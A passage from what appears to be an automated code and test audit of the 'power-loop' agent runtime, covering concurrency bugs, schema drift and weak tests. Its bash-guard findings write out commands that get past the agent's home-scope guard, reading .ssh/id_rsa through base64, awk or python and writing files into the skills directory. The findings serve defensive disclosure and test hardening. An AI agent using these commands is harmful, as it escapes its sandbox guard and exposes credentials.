- Test: Render Dialect.ddl('pl_') for all three dialects and assert the background_tasks index name is identical across backends (fails today: MySQL uses idx_bgtasks_session_status).
- Verify: Reproduced. dialect.py: SQLite (L114) and Postgres (L243) name the background_tasks index `{p}idx_background_tasks_session_status`; MySQL (L359) uses `{p}idx_bgtasks_session_status` via an inline `KEY`. Rendered Dialect.ddl('pl_') across all three: sqlite/postgres -> `pl_idx_background_tasks_session_status`, mysql -> `pl_idx_bgtasks_session_status`. So the cross-dialect name divergence is real and exactly as described. HOWEVER impact is minimal and the finding concedes this: VERIFY (schema.py:339) only probes _STORE_TABLES via _table_exists and never checks index names, so no runtime/VERIFY br

### [HIGH] wake-guard-nonatomic-rmw (reproduced)
**Workflow completion-wake guard bypasses journal atomicity (non-atomic get+set), clobbering concurrent journal writes and risking double-wake**

- Where: power_loop/workflow/runner.py:247-265 (make_wake_guard); contrast power_loop/workflow/journal.py:18-27 docstring + lines 125/159/209 which mandate mutate_runtime_state
- Mechanism: make_wake_guard reads the journal via get_runtime_state, checks the woke flag, sets woke=True on the in-memory blob, then writes the whole blob via set_runtime_state. The async store yields the event loop between the get (DB fetchone at store.py:1197) and the set (separate transaction at store.py:1208), exactly the unsafe window the journal docstring warns about and for which every other journal mutation (update/record_step/seed) was routed through the row-locked mutate_runtime_state in the G1 fix. The guard was missed (the journal-race test suite never exercises it). Two reproduced consequences: lost-update, where the guard writes back the whole stale blob and reverts a concurrent atomic resume _mark_resuming (terminal to running, attempts+1) back to status completed/attempts 1 and drops a late halt-sibling record_step; and double-wake, where the non-serialized woke check-and-set lets two at-least-once timer firings or the eager_wake vs durable-timer race both deliver, waking the parent twice.
- Trigger: A detached or resumed workflow whose completion wake timer fires while another journal write is in flight: resume_detached marking the run running at the same scan tick the prior attempt wake timer fires; a halt branch orphaned sibling settling via record_step as the wake timer fires; or the same wake timer delivered twice after recover_stale_firing_timers re-arms a stuck firing row. Reproduced in-process with a store whose get/set yield the loop, matching the real SQLite/PG store.
- Test: In tests/unit/test_workflow_journal_race.py: seed and finalize a run, then asyncio.gather(make_wake_guard(store)(ctx), journal.update(store, sid, run_id, allow_terminal=True, status=running, attempts=2)) using the yielding async store; assert the final journal has status running, attempts 2, and woke True. Fails today (status reverts to completed, attempts 1); passes once make_wake_guard routes through mutate_runtime_state.
- Verify: CONFIRMED + REPRODUCED against the real async SQLite store via /home/ubuntu/deeptalk/power-loop/.venv.

Code: power_loop/workflow/runner.py:252-263 (make_wake_guard) does a bare get_runtime_state -> check woke -> set woke=True -> set_runtime_state. store.py confirms get_runtime_state (line 1197, separate fetchone) and set_runtime_state (line 1208, separate transaction) are two distinct awaited DB ops with an event-loop yield between them and NO row lock. This is exactly the unsafe pattern the journal docstring forbids (journal.py:18-27: "Bare get_runtime_state + set_runtime_state is NOT safe h

### [MEDIUM] bash-home-scope-denylist-bypass (reproduced)
**POWER_LOOP_HOME bash scope guard bypassable via unlisted commands**

- Where: power_loop/tools/default_tools.py:261-313 (_validate_bash_command_scope; gates run_bash:599, BackgroundManager.run:1117)
- Mechanism: Scope guard only blocks a home path when the command also contains one of ~9 hardcoded read/write hints. Any other reader/writer is allowed despite the error text claiming a hard block. Repro home_dir=/home/agent: cat of .ssh/id_rsa BLOCKED but awk/base64/od/python and input-redirect reads ALLOWED; dd-of/install/python-open-w writes ALLOWED.
- Trigger: Agent runs bash base64 of $POWER_LOOP_HOME/.ssh/id_rsa or background_run dd of=$POWER_LOOP_HOME/skills/evil with a configured home_dir+allowlist and no sandbox ShellBackend; scope check returns None.
- Test: Patch get_runtime_env to home_dir+narrow allowlist; assert _validate_bash_command_scope returns non-None for awk/base64/od/python read and dd-of/install/python-open-w write on a non-allowlisted home path. Fails today.
- Verify: REPRODUCED exactly via .venv. With RuntimeEnv.from_env(home_dir="/home/agent", skills_dir="/home/agent/skills"), allowlist=['/home/agent/.cache','/home/agent/logs','/home/agent/skills'], _validate_bash_command_scope returns: BLOCKED for `cat /home/agent/.ssh/id_rsa` and `echo x > /home/agent/evilfile`; but ALLOWED (returns None) for awk/base64/od/python/xxd/strings reads, input-redirect read (`while read l; do ...; done < secret`), and dd of=/install/python open(w)/truncate writes — all targeting the NON-allowlisted home path. Root cause (power_loop/tools/default_tools.py:293-313): the guard o


## Test-quality audit

### fold/representation/projection-fold tests
Audited the four fold/representation/projection tests against power_loop/runtime/fold.py, representation.py, history_projector.py, fold_adapter.py and agent/stateful_loop.py. All 75 tests pass, but several are weak in ways that would let real regressions through. The two biggest structural problems: (1) the ENTIRE test_history_projection_loop.py file (711 lines) tests the LEGACY 2.x DefaultDeterministicProjector via a test-only _DeterministicFold stub that calls representation.compact() — a method the real 3.0 ProjectedRepresentation does NOT have. fold.py's own docstring says "There is intentionally NO deterministic/no-LLM fold". So all the loop-level fold-mechanics assertions (keep_last_n, roll-forward, compact span, migration) exercise removed/legacy code, NOT the production fold path (LLMSummaryFold + loop _plan_and_run_projection_fold). (2) EVERY loop-level fold test sets max_tokens=10 (or 1), making the trigger threshold ~0 so the fold ALWAYS fires — the token-gating logic (estimate_tokens(rendered_prefix) < threshold, the trigger_ratio computation) is never tested in its gating regime, so an inverted/broken threshold passes everything. Plus: the most bug-prone projection logic (the _NO_RESULT '<missing>' sentinel, the FIFO-deque multimap for duplicate/missing tool_call_ids, and the ToolDefinition.project hook with its exception fallback) has ZERO unit coverage — test_projection_project_send_and_render only uses one perfectly-paired tool call with tool_registry=None. Two tests named for "concurrency"/"no double compact" run strictly sequentially and never exercise the optimistic-concurrency race they claim to cover.

Weak tests:
- tests/unit/test_history_projection_loop.py::test_projection_compaction_keeps_last_n [stale/tests-removed-behavior] — Drives the fold via _DeterministicFold which calls context.representation.compact() — a method that exists ONLY on the legacy 2.x DefaultDeterministicProjector. The real 3.0 ProjectedRepresentation has no compact() and the production fold is LLMSummaryFold/AgenticFold driven by the loop's _plan_and_run_projection_fold. So this asserts keep_last_n/span behavior of REMOVED code; a regression in the real fold span selection in _plan_and_run_projection_fold (e.g. wrong fold_sends slice, off-by-one in keep) would not be caught here. Also max_tokens=10 makes the threshold ~0 so the gate never participates. → Run the loop with the REAL LLMSummaryFold (scripted summary LLM), keep_last_sends=2, and a REALISTIC max_tokens (e.g. 8000) with sends large enough to cross trigger_ratio*max_tokens. Assert: compact_from_send/compact_to_send equal exactly send 1 once 3 sends exist and the rendered prefix crosses threshold; assert the kept tail = sends {2,3}; AND assert NO compact when the same 3 sends stay below threshold (large max_tokens, tiny sends).
- tests/unit/test_fold_loop_integration.py::test_projection_loop_runs_real_llm_summary_fold [wrong-regime] — Uses max_tokens=10, so threshold=int(10*0.75)=7 and any rendered prefix exceeds it — the fold fires unconditionally. It proves the real LLMSummaryFold gets CALLED, but never proves the loop's trigger gate (estimate_tokens(rendered_prefix) < threshold in _plan_and_run_projection_fold) actually decides whether to fold. If that comparison were inverted or the threshold computed wrong (e.g. always 0), this test still passes. The token-driven trigger — the whole point of trigger_ratio — is untested in its gating regime. → Two assertions with a real max_tokens (8000): (a) three SMALL sends below 8000*0.75 → assert latest_project_compact is None (gate suppresses fold); (b) sends padded so the rendered prefix crosses the threshold → assert a compact appears spanning the expected sends. This pins the actual < threshold gate, not just that the fold callable runs.
- tests/unit/test_representation_fold.py::test_projection_project_send_and_render [asserts-nothing-real] — The only project_send test for ProjectedRepresentation uses ONE assistant tool_call with a perfectly matching tool result and tool_registry=None. It never exercises the code paths where bugs live: an unfinished/failed tool call with NO result row (should render '<missing>' via _NO_RESULT), DUPLICATE tool_call_ids or repeated ids (the deque multimap + popleft), an empty-id ('') call, or a ToolDefinition.project hook (incl. its except->fallback). A regression that collapses two results onto one id, drops the second, or masks a missing result as empty '' would pass this test untouched. → Add cases: (1) assistant emits tool_call id='a' but NO tool row for 'a' → assert projected tools == [{'name':..., 'result':'<missing>'}]; (2) two tool rows with id='a' and two assistant calls id='a' → assert both results consumed in FIFO order (no collapse/drop); (3) a tool_registry whose ToolDefinition.project returns a dict and one that raises → assert dict merged into the tool entry and the raising one falls back to truncated result; (4) project hook returns None → truncating fallback used.
- tests/unit/test_fold_loop_integration.py::test_two_loops_real_fold_no_double_compact [asserts-nothing-real] — Named 'no_double_compact' and described as exercising 'the optimistic commit path', but the two loops run STRICTLY SEQUENTIALLY (await la.send; await lb.send; await la.send). No two folds ever interleave, so the optimistic-concurrency CAS (commit_projection_fold's expected_prior_to_send stale-skip) is never put under contention. The race-condition bug it implies (two concurrent folds both computing from_send=1 and one clobbering the other) cannot be reproduced by this ordering — a broken CAS still passes. → Either delete it as redundant with the store-level test_commit_projection_fold_stale_skip_and_supersede, or make it genuinely concurrent: await asyncio.gather(la.send(...), lb.send(...)) on the same session/store with a fold-triggering config, then assert exactly one compact row and no duplicate (send_index,kind) rows. To force the interleave deterministically, gate both folds on an asyncio.Event released after both have read the prior cursor.
- tests/unit/test_representation_fold.py::test_verbatim_renders_compact_row [asserts-nothing-real] — Passes a compact ProjectMessageRow with content={'summary':...} and rendered_text=None, asserting it renders to the summary text. But _render_compact_row PREFERS rendered_text over content['summary'] (text = row.rendered_text or content['summary']). The precedence branch — the one a custom fold returning rendered_text relies on — is never exercised. A regression that dropped the rendered_text branch, or inverted the precedence, would still pass. Same applies to test_projection_renders_compact_row. → Add a case where rendered_text='RENDERED' and content={'summary':'SUMMARY'} differ → assert the rendered output uses 'RENDERED' (rendered_text wins); keep the summary-fallback case where rendered_text is None. Do this for both VerbatimRepresentation and ProjectedRepresentation.
- tests/unit/test_representation_fold.py::test_llm_summary_fold_rolls_prior_compact_forward [asserts-nothing-real] — Asserts only that 'PRIOR SUMMARY' is somewhere IN the summarizer prompt — not that the prior compact is rendered BEFORE the new send's text. The invariant that matters for roll-forward is chronological order (prior compact first, then folded sends). If _render_span_text rendered the rows in reversed/scrambled order (a plausible regression in row ordering, which the project-team memory already flagged once as a real ordering bug), the summarizer would get inverted chronology and this substring check still passes. → Assert ordering: idx_prior = sent.index('PRIOR SUMMARY'); idx_new = sent.index('new q'); assert idx_prior < idx_new. Also assert folded_to_send==1 and from_send carries the prior's range (which the loop, not the strategy, owns — so test it at the loop level via _plan_and_run_projection_fold/commit_projection_fold).
- tests/unit/test_history_projection_loop.py::test_identity_projector_never_compacts [wrong-regime] — Asserts IdentityProjector 'never folds' but routes through _projector_loop which sets representation=IdentityProjector AND a _DeterministicFold(keep_last_sends=0) directly on the new 3.0 axis. It does NOT exercise the legacy mapping path AgentLoopConfig(history_projector=IdentityProjector()), which goes through _fold_from_legacy_projector that CLAMPS keep=max(1, keep) — i.e. a legacy keep_last_sends=0 ('never fold') becomes keep=1 and STARTS folding. The real DeepTalk-style legacy call site that wants 'never fold' would silently begin folding, and no test catches it. → Add a config-level test: with warnings suppressed, c = AgentLoopConfig(history_projector=IdentityProjector(), compactor=None); assert the mapped fold preserves never-fold semantics (either keep_last_sends mapping that doesn't fold, or document+assert the clamp behavior explicitly). Then a loop test driving that config over many small sends asserting latest_project_compact stays None (or, if the clamp is intended, asserts it now folds and update the legacy contract knowingly).

Gaps:
- The loop's token-threshold fold GATE in _plan_and_run_projection_fold (estimate_tokens(rendered_prefix) < int(max_tokens*trigger_ratio)) has NO test in its gating regime — every loop test uses max_tokens=10/1 so the threshold is ~0 and the fold always fires. A test must assert NO fold below threshold and fold above, with a realistic max_tokens. This is the single highest-risk untested path (an inverted comparison or wrong threshold = either never-fold context blowup or fold-every-send churn).
- The REAL production fold mechanics (LLMSummaryFold under ProjectedRepresentation driven by _plan_and_run_projection_fold: span selection of fold_sends = live_sends[:-keep], roll-prior-forward, from_send derivation from prior.compact_from_send) are not unit-tested with the real strategy — test_history_projection_loop.py tests these via the legacy DefaultDeterministicProjector.compact() stub instead. Need loop tests with the real LLMSummaryFold asserting from_send/to_send and that folded rows remain (recall_send).
- ProjectedRepresentation.project_send tool-pairing edge cases: _NO_RESULT '<missing>' for unfinished/failed calls, the deque-multimap FIFO consumption for duplicate/missing/empty tool_call_ids, and the ToolDefinition.project hook (dict result merge, non-dict→summary truncation, exception→fallback). Entirely untested.
- _render_compact_row rendered_text-vs-content['summary'] precedence is never exercised (all tests pass rendered_text=None). A custom fold returning rendered_text relies on this branch.
- FoldContext.current_tokens is documented as 'loop's incremental rendered-prefix estimate' but the projection fold path (_plan_and_run_projection_fold) never populates it — it's dead in this area and no test asserts the projection fold uses (or ignores) it. The verbatim CompactionContext.current_tokens path is tested in a different file; the projection FoldContext one is not.
- AgenticFold note application end-to-end under the REAL projection loop with note_update (not just note_add): test_projection_loop_agentic_fold_writes_notes covers note_add only. note_update (NoteOp op='update' → store.update_note with the int note_id) — including the bad-note_id error path reaching the store — has no loop-level coverage; the bad-id case is only unit-tested at the strategy level where it's intentionally skipped.
- LLMSummaryFold with a summary response that has NO <summary>...</summary> tags (returns trimmed raw text) and the empty-<summary></summary>→None path at the fold level are untested — only the well-formed tag case is exercised.

### compaction/recall/sink/history-alignment tests
Audited compaction/recall/sink/history-alignment tests against the post-3.0 source (power_loop/runtime/{compact,representation,fold}.py, history_projector.py, agent/sink.py, agent/types.py). 51 tests pass. KEY ARCHITECTURE FACT (MEMORY note "3.0 NOT implemented" is STALE): 3.0 IS implemented. The live context path is now Representation × FoldStrategy: AgentLoopConfig.resolve_compactor()/projection_representation drive runtime/representation.py (VerbatimRepresentation / ProjectedRepresentation) + runtime/fold.py (LLMSummaryFold / AgenticFold). The OLD runtime/history_projector.py classes (DefaultDeterministicProjector, IdentityProjector) are now DEPRECATED shims, reachable only via the legacy history_projector= kwarg; their .compact() method is called by NO live code (verified: grep for `.compact(` finds zero non-test call sites — fold is exclusively FoldStrategy.fold()). The deterministic/no-LLM fold was explicitly REMOVED ("There is intentionally NO deterministic/no-LLM fold"). The STRONG suites are test_compaction_double_fold.py (invariant: reload==in-memory, hypothesis property test, end-to-end double-fold), test_compact.py (DefaultCompactor still live via verbatim mapping; orphan-tool/atomic-pair regressions), test_representation_fold.py + test_fold_loop_integration.py (cover the LIVE 3.0 path well incl. timeout/soft-fail/optimistic-commit), and the sink/aclose/budget tests (real concurrency). The WEAK area is test_history_projector.py: it pins a frozen deprecated class whose compact() is dead and whose project_send/render are duplicated (untested) by the live representation.py. Several recall_compacted tests assert header-string trivia rather than tool behavior.

Weak tests:
- tests/unit/test_history_projector.py::test_default_compact_folds_sends [stale/tests-removed-behavior] — Tests DefaultDeterministicProjector.compact() — a method NO live code calls post-3.0. Folding now lives in runtime/fold.py FoldStrategy.fold() (LLM-backed); the deterministic concat-compact was deliberately removed ('There is intentionally NO deterministic/no-LLM fold'). This test would pass forever even if the entire live fold path were deleted or broken; it cannot catch any regression in production compaction. → Delete it. Replace with a loop-level test that the LIVE fold runs under the projection representation: configure ProjectedRepresentation()+LLMSummaryFold(keep_last_sends=1, trigger_ratio tiny), drive 3 sends, and assert store.latest_project_compact(sid).content['summary'] is the LLM's summary AND that recall_send re-expands a folded send (the actual user-facing path). test_fold_loop_integration.py::test_projection_loop_runs_real_llm_summary_fold is the right shape — extend it to assert the compact REPLACED the folded sends in the rendered prefix.
- tests/unit/test_history_projector.py::test_default_compact_rolls_prior_compact_forward [stale/tests-removed-behavior] — Same dead .compact() method. The live 'roll prior compact forward' logic is in fold.py (_folded_sends + LLMSummaryFold.fold rolling a leading compact row) and is what actually ships — covered by test_representation_fold.py::test_llm_summary_fold_rolls_prior_compact_forward. This duplicate against the deprecated class adds zero protection: a bug in the live roll-forward (e.g. wrong from_send cursor) passes here. → Delete. The live equivalent already exists (test_representation_fold.py::test_llm_summary_fold_rolls_prior_compact_forward + test_fold_loop_integration.py::test_commit_projection_fold_stale_skip_and_supersede). If extra coverage is wanted, assert in the loop test that compact.compact_from_send stays at the ORIGINAL first send across two successive folds (the cursor bug the dead test was guarding).
- tests/unit/test_history_projector.py::test_compact_bounded_by_max_compact_chars [stale/tests-removed-behavior] — max_compact_chars and the no-LLM bounded-concat compact only exist on the deprecated DefaultDeterministicProjector. The live LLMSummaryFold self-bounds via summary_max_tokens through an actual LLM call — a completely different mechanism. This test guards a knob the shipped fold doesn't have; an unbounded-growth regression in the live fold's summary would not fail it. → Delete. If unbounded-context growth is a real risk, test the live path: LLMSummaryFold(summary_max_tokens=N) and assert the persisted compact row's token_estimate / content length is bounded after folding a large span, and that dropped detail is still recoverable via recall_send.
- tests/unit/test_history_projector.py::test_default_project_send_basic [wrong-regime] — Exercises DefaultDeterministicProjector.project_send, but the LIVE projection is ProjectedRepresentation.project_send in representation.py (a separate, duplicated implementation with the same deque/_NO_RESULT logic). The deque-multimap, missing-vs-empty (_NO_RESULT), project-hook-None, and hook-exception edge cases are tested ONLY against the deprecated clone — representation.py's identical edge logic has NO direct test (test_representation_fold.py covers only the basic project_send). A regression in representation.py::_project_tool (e.g. dropping the deque, collapsing duplicate ids) passes the whole suite. → Port the valuable edge cases (duplicate_tool_call_id FIFO, missing_vs_empty, project_hook_receives_None, missing_result_hook_exception_falls_back) to run against the LIVE ProjectedRepresentation from runtime/representation.py, then delete the history_projector copies. Same asserts, just `from power_loop.runtime.representation import ProjectedRepresentation` and call its project_send.
- tests/unit/test_recall_compacted.py::test_returns_folded_rows_and_excludes_active [asserts-nothing-real] — Beyond the membership checks it asserts the literal header string '4 of 4 compacted'. That pins cosmetic copy, not behavior — a reword to 'compacted: 4' breaks the test without any bug, while the real risk (folded rows leaking ACTIVE content, or seeding via record_compaction WITHOUT fold_seqs taking the BETWEEN-range path that the production sink never uses) is only lightly touched. All recall_compacted tests seed contiguous ranges through record_compaction(from_seq,to_seq) with no fold_seqs, so they exercise the legacy BETWEEN branch, not the explicit-fold-set branch the live sink calls. → Drop the header-string assertion. Add a case that mirrors production: fold a NON-contiguous set via record_compaction(..., fold_seqs=[s1,s3]) (the path the sink actually uses) and assert recall_compacted returns s1+s3 content but NOT the un-folded s2 — catching a regression where recall surfaces a row the fold-set excluded.
- tests/unit/test_recall_compacted.py::test_limit_caps_to_most_recent [asserts-nothing-real] — Asserts the substrings '3 of 10 compacted' and 'most recent' (presentation copy) alongside the real membership check. The copy assertions are brittle tautologies that fail on harmless wording changes and catch no logic bug; the membership part (newest kept, oldest dropped) is the only load-bearing assertion. → Keep only the membership assertions (folded-9/folded-7 present, folded-0 absent) and additionally assert exactly 3 rows are returned (e.g. count distinct seq blocks == limit), so an off-by-one in the most-recent cap is caught regardless of header wording.

Gaps:
- runtime/representation.py::ProjectedRepresentation._project_tool — the deque-multimap (duplicate tool_call_id FIFO), _NO_RESULT missing-vs-empty distinction, project-hook-returns-None, and project-hook-raises fallback are implemented HERE (live) but tested ONLY against the deprecated DefaultDeterministicProjector clone in test_history_projector.py. A regression in the live edge handling (collapsing duplicate ids onto the last result, treating <missing> as '', or a raising tool projector breaking the whole fold) is uncaught.
- agent/types.py::AgentLoopConfig.__post_init__ legacy mapping (_resolve_context_axes) — the deprecated history_projector=/compactor=/migrate_history_on_projection_switch= → representation/fold_strategy migration (incl. _fold_from_legacy_projector seeding keep_last_sends/trigger_ratio from a legacy projector, and _legacy_verbatim_compactor preserving compactor=None EXACTLY) is the back-compat seam DeepTalk relies on; no unit test asserts a DefaultDeterministicProjector passed as history_projector= becomes the live representation with its knobs honored, nor that compactor=None still disables compaction.
- agent/types.py::AgentLoopConfig.resolve_compactor — the verbatim-mode mapping of AgenticFold/LLMSummaryFold → AgenticMemoryCompactor/DefaultCompactor (passing keep_last_sends→keep_last_n, trigger_ratio, summary_max_tokens, max_rounds) is the only thing that makes the in-place compactor honor the new fold_strategy knobs. No test asserts these params actually flow through (a swapped/dropped knob, e.g. keep_last_n always defaulting to 4, silently changes fold aggressiveness with green tests).
- agent/sink.py::SQLiteSink.on_message_appended pending-state partial-resolution branch (lines ~168-194: multi-tool-call assistant where SOME tool results land) — rebuilds pending with remaining tool_calls + remaining pending_interactions. test_stateful_loop covers single-tool pending set/clear, but the partial multi-tool resolution (one of two tool_call_ids resolved → pending must keep the other) has no direct test; a bug here strands a session pending or clears it early.
- agent/sink.py::SQLiteSink.on_compaction expected_history_len safety net is tested for the SESSION_START-hook desync (test_compact.py::...desync), but the OTHER documented trip — a fold boundary landing on a None placeholder (recalled memory_* row) returning early without persisting — is only asserted indirectly; the explicit 'fold_start_idx/fold_end_idx lands on None → skip persistence' branch (lines 282-288) has no targeted test that the run still completes and active rows stay correct.

### store/schema/async-orchestration/pending tests
I audited the store/schema/async-orchestration/pending test area. The headline finding: a large block of test code (~795 lines across 5 files) tests ONLY the legacy synchronous store `power_loop.runtime.session_store.SessionStore`, which is DEAD in production — nothing under power_loop/ imports it; the public/production `SessionStore` (exported from __init__.py) is the async `power_loop.runtime.store.store.SessionStore`. These legacy-only suites (test_session_store.py, test_session_store_migrations.py, test_session_store_retention.py, test_session_store_export.py, test_session_store_read_pool.py) cannot catch a regression in the production async store. Most of their behaviors ARE redundantly covered against the live async store by the genuinely strong parity suite (test_store_parity*.py) and the bug-review regression suites — but the legacy migration-ladder and read-pool features they test no longer exist in production at all (the async store uses pl_schema_migrations + CURRENT_SCHEMA_VERSION, not PRAGMA user_version + MIGRATIONS; and has no read_pool_size), so those two files are pure stale/removed-behavior tests. The GOOD news: the production async store's hard paths are well-tested — optimistic-concurrency fold stale-skip (test_fold_loop_integration), v1→v2 send_index migration (test_project_messages_store), real PG/MySQL id-allocation races (test_store_bug_review_2_0_server_fixes), atomic rollback/commit-wedge/failed-rollback (test_store_bug_review_2_0_fixes, test_session_store_atomicity), schema policy, and event-loop offload (test_store_offload, verified the injection point is real). human_input.py (HumanInputRequired/request_user_input/to_pending) has NO direct unit test — only exercised indirectly via loop tests.",

Weak tests:
- tests/unit/test_session_store_read_pool.py::test_pooled_reads_run_concurrently_with_a_held_write_lock (and the whole file) [stale/tests-removed-behavior] — The entire file targets power_loop.runtime.session_store.SessionStore.open(..., read_pool_size=N) — a feature that exists ONLY on the dead legacy store. The production async store (runtime.store.store) has no read_pool_size param and a completely different read path (per-call asyncio.to_thread). A regression that broke concurrent reads in the PRODUCTION store would pass every test here, because the production read path is never instantiated. The headline 'reads don't block behind the writer lock' guarantee is unverified for the code that actually ships. → Delete the read-pool tests or port the intent to the async store: open the async SessionStore on a file DB, hold a long write (patch _b_exec to sleep under the writer asyncio.Lock), and assert a concurrent load_active_messages still returns promptly — i.e. test the production offload/read concurrency, not a removed feature.
- tests/unit/test_session_store_migrations.py::test_migrations_ladder_is_consistent (and the file's PRAGMA user_version cases) [stale/tests-removed-behavior] — Asserts MIGRATIONS/CURRENT_SCHEMA_VERSION consistency and the PRAGMA user_version upgrade ladder of the LEGACY store. Production uses runtime.store.schema with a pl_schema_migrations table and _migration_steps(). This test passes regardless of whether the production migration ladder (the v1→v2 send_index ALTER, future steps) is correct or even bumped — it guards the wrong version registry entirely. A forgotten CURRENT_SCHEMA_VERSION bump in runtime.store.schema would NOT be caught here. → Add an async-store ladder-consistency test in runtime.store.schema: assert MIGRATION targets are sorted/unique and max == CURRENT_SCHEMA_VERSION, AND a from_version=k→CURRENT round-trip test for every k (seed a store at version k by rolling pl_schema_migrations back + dropping the version-k columns, reopen, assert every step landed). test_project_messages_store already does this for k=1; generalize it so a new step can never ship untested.
- tests/unit/test_session_store.py::test_concurrent_appends_get_distinct_seqs [wrong-regime] — Tests seq-allocation uniqueness on the LEGACY single-connection sync store (RLock-guarded sqlite3) — a regime where collisions are nearly impossible by construction. The real seq-allocation race lives in the async store under FOR UPDATE row locking on PG/MySQL (multiple writers reading the same MAX/next_seq). This test would pass even if the async store's lock_state were broken, because it never touches it. → Drop it as redundant; the meaningful version already exists (test_store_bug_review_2_0_server_fixes::test_pg_concurrent_create_timer_no_pk_collision). Optionally add a PG/MySQL concurrent-append_message parity case asserting 20 gathered appends yield gap-free unique seqs on a server backend (the SQLite analog is test_store_bug_review_2_0_fixes::test_concurrent_file_handles_serialize).
- tests/unit/test_session_store_export.py::test_export_import_round_trip [stale/tests-removed-behavior] — Round-trips export/import on the legacy store only. It does not exercise the production async export, and critically it predates send_index, so it never asserts send_index survives the round-trip on the live store. A regression dropping send_index from the async store's _EXPORT_TABLES would not be caught here. → Keep coverage on the async store: test_project_messages_store::test_export_import_preserves_send_index already does the right thing — make it the canonical export test and retire the legacy-only round-trip (or convert it to drive runtime.store.store.SessionStore so the compact_note ord + compacted-originals round-trip is asserted against production).
- tests/unit/test_session_store_retention.py (all cases, e.g. test_prune_compacted_leaves_active_and_note_identical + older_than_ms cases) [stale/tests-removed-behavior] — Rich retention edge cases (older_than_ms bounds, keep_recent interactions) are asserted ONLY against the legacy store. The async store's prune_compacted_messages/prune_usage_rounds is exercised by parity's scn_prune for a SINGLE keep_last/keep_recent value, so the older_than_ms branch and keep+age combinations of the PRODUCTION code are effectively untested. A bug in the async store's age-filter SQL would slip through. → Add async-store retention cases mirroring the legacy edge cases: drive runtime.store.store.SessionStore with older_than_ms (stamp created_at/updated_at via direct UPDATE so the age threshold is deterministic) and assert exactly which rows survive — for both prune_usage_rounds and prune_compacted_messages, including the keep_last AND older_than_ms combined branch.
- tests/unit/test_event_bus_async.py::test_async_subscriber_task_is_retained_then_drained [asserts-nothing-real] — It reaches into bus._async_tasks (a private set) and asserts len==1 right after publish() then ==set() after a poll-drain. This pins the implementation detail (a particular bookkeeping set) rather than the actual H1.7/C6 invariant: that a slow async subscriber's task is not garbage-collected mid-flight and its exception is retrieved (no 'Task exception was never retrieved'). If someone reimplemented retention with a different container, this fails despite correct behavior; conversely the real GC-warning bug can't be directly observed here. → Assert the behavior: schedule a slow async subscriber (await an Event that the test releases after forcing a GC), assert the handler still completes (ran.set seen) — i.e. it wasn't collected — and, for the error case, capture warnings via a custom asyncio exception handler / caplog and assert NO 'never retrieved' warning is emitted and the handler's exception WAS surfaced exactly once.

Gaps:
- power_loop/runtime/human_input.py has NO dedicated unit test. request_user_input's validation (empty/whitespace prompt raises ValueError; kind defaulting to 'text' when blank), and HumanInputRequired.to_pending()'s exact dict shape + defensive copying of options/metadata (list()/dict() so caller mutation can't corrupt the persisted pending), are only exercised incidentally through full loop tests. A regression that, e.g., stored a shared mutable reference or dropped interaction_id would not be directly caught.
- Async store retention older_than_ms branch (prune_usage_rounds + prune_compacted_messages) is untested against the production store — parity's scn_prune only covers keep_last/keep_recent with no age filter, so the `created_at < now-age` / `updated_at < now-age` SQL on the async/PG/MySQL backends has no deterministic-time assertion.
- Timer recovery/heartbeat paths on the async store: recover_stale_firing_timers (re-arm rows older than older_than_ms) and heartbeat_firing_timer keeping a live row fresh so it is NOT reclaimed are not in the parity scenarios; the at-least-once double-fire-vs-not boundary (a stuck firing row reclaimed, a heartbeated one spared) appears untested at the store level on the production store.
- write_projection_migration (the one-time mode-switch seeding: project_rows + optional compact + metadata_patch all atomic under the session lock) — I found no test driving this method directly; a crash/half-migration or a missed metadata marker (the very thing its atomicity comment promises) would not be caught.
- merge_session_metadata / write_send_projection_rows snapshot consistency under genuine concurrency: the optimistic-concurrency stale-skip is tested single-threaded (test_fold_loop_integration), but there is no test of two concurrent write_send_projection_rows + commit_projection_fold racing on a server backend (PG/MySQL FOR UPDATE) to prove the lock actually serializes the snapshot/fold and the superseded-compact DELETE under real contention.
- deactivate_messages (history-repair backstop that DROPs an orphan tool-result row) has no visible store-level test asserting the dropped rows no longer load into load_active_messages while staying auditable in load_all_messages with state=dropped — a path whose whole point is the failure/edge regime (provider rejecting an orphan tool result).

### workflow/tools/timers/security tests
Audited workflow/tools/timers/security tests in power-loop. VERDICT: the workflow tier (engine, journal, resume, subprocess executor, halt/cancel, fanout) and the timer tier are GENUINELY STRONG — they are real regression tests that drive actual logic, assert invariants, and several are documented to fail against the pre-fix implementation (G1 journal lost-update race, C2/C6 halt scope, H1.4 eager-wake re-arm, double-fire on slow delivery, foreach atomic replay, subprocess crash+resume). I could not find tautological or over-mocked tests there worth flagging. The REAL weakness is concentrated in the SECURITY guard tests (test_bash_guards.py): they parametrize a curated list of inputs that the hint-based guards happen to catch, while the guards have trivial, exploitable bypasses the tests never probe — giving false confidence that bash is sandboxed. I confirmed the bypasses by running the guards directly. A couple of tool tests are also assertion-light. Source-level note: the bypasses are real bugs in default_tools._validate_bash_command_scope / _dangerous_command_reason, but the test-quality failing is that the suites are written to only the passing cases.

Weak tests:
- tests/unit/test_bash_guards.py::test_scope_blocks_read_of_home_internals [wrong-regime] — Only tests `cat`. The guard matches a hard-coded READ hint list (' cat ',' less ',' head ',' tail ',' grep ',' rg ',' find ') surrounded by spaces. I verified live: `python -c open('<HOME>/secret.txt')`, `awk 1 <HOME>/secret.txt`, `sed -n p <HOME>/secret`, `xxd/od/strings/sort/cut/nl <HOME>/secret`, `dd if=<HOME>/secret` ALL return None (allowed) — they read agent-home internals and defeat the guard. The test asserts the guard blocks home reads, but it only proves it blocks ONE of dozens of readers, masking a wide-open exfiltration path. → Parametrize over readers NOT in the hint list and assert each is blocked: for cmd in [f'python -c "print(open(\'{HOME}/secret\').read())"', f'awk 1 {HOME}/secret', f'sed -n 1p {HOME}/secret', f'xxd {HOME}/secret', f'od -c {HOME}/secret', f'sort {HOME}/secret', f'strings {HOME}/secret']: assert _validate_bash_command_scope(cmd) is not None. This forces the guard to stop allowlisting by command name and instead key on the home path being touched (or sandbox at the FS layer).
